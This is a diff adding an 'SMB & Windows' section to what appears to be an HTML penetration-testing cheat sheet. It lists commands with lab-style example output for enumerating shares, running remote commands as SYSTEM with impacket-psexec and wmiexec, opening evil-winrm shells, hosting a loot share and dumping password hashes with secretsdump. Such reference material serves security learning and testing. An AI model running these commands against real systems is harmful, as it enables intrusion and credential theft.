@@ -1,0 +1,73 @@
+<div class="section" data-category="smb">
+    <div class="section-header">
+        <div class="section-icon network">💼</div>
+        <h3>SMB &amp; Windows</h3>
+    </div>
+    <ul class="command-list">
+        <li class="command-item">
+            <span class="cmd">smbclient -L //target</span>
+            <span class="desc">List SMB shares</span>
+            <code class="example">$ smbclient -L //10.10.10.5 -N<br>Sharename  Type  Comment<br>public     Disk  Public files</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">smbclient //target/share</span>
+            <span class="desc">Connect to SMB share</span>
+            <code class="example">$ smbclient //10.10.10.5/public -N<br>smb: \&gt; ls<br>  backup.zip  4096</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">smbclient //target/share -U user</span>
+            <span class="desc">Authenticated SMB</span>
+            <code class="example">$ smbclient //10.10.10.5/admin -U admin%Pass123<br>smb: \&gt; get flag.txt</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">smbmap -H target</span>
+            <span class="desc">SMB share enum</span>
+            <code class="example">$ smbmap -H 10.10.10.5<br>[+] public  READ<br>[+] admin$  NO ACCESS</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">smbmap -H target -u user -p pass</span>
+            <span class="desc">Authenticated share enum</span>
+            <code class="example">$ smbmap -H 10.10.10.5 -u admin -p Pass123<br>[+] admin$  READ, WRITE</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">rpcclient -U "" target</span>
+            <span class="desc">RPC enumeration</span>
+            <code class="example">$ rpcclient -U "" -N 10.10.10.5<br>rpcclient $&gt; enumdomusers<br>user:[admin] rid:[0x1f4]</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">crackmapexec smb target</span>
+            <span class="desc">SMB assessment</span>
+            <code class="example">$ crackmapexec smb 10.10.10.5<br>SMB  10.10.10.5  445 DC01 [*] Windows 10</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">crackmapexec smb target -u user -p pass --shares</span>
+            <span class="desc">Enum shares with creds</span>
+            <code class="example">$ crackmapexec smb 10.10.10.5 -u admin -p Pass123 --shares<br>[+] admin$ READ,WRITE</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">impacket-psexec user@target</span>
+            <span class="desc">Remote execution</span>
+            <code class="example">$ impacket-psexec admin:Pass123@10.10.10.5<br>C:\Windows\system32&gt; whoami<br>nt authority\system</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">impacket-wmiexec user@target</span>
+            <span class="desc">WMI execution</span>
+            <code class="example">$ impacket-wmiexec admin:Pass123@10.10.10.5<br>C:\&gt; whoami<br>target\admin</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">impacket-smbserver share /path</span>
+            <span class="desc">Host SMB share</span>
+            <code class="example">$ impacket-smbserver share /tmp/loot -smb2support<br>[*] Incoming connection from 10.10.10.5</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">impacket-secretsdump user@target</span>
+            <span class="desc">Dump SAM/NTDS hashes</span>
+            <code class="example">$ impacket-secretsdump admin:Pass123@10.10.10.5<br>Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::</code>
+        </li>
+        <li class="command-item">
+            <span class="cmd">evil-winrm -i target -u user -p pass</span>
+            <span class="desc">WinRM shell</span>
+            <code class="example">$ evil-winrm -i 10.10.10.5 -u admin -p Pass123<br>*Evil-WinRM* PS C:\Users\admin&gt;</code>
+        </li>
+    </ul>
+</div>
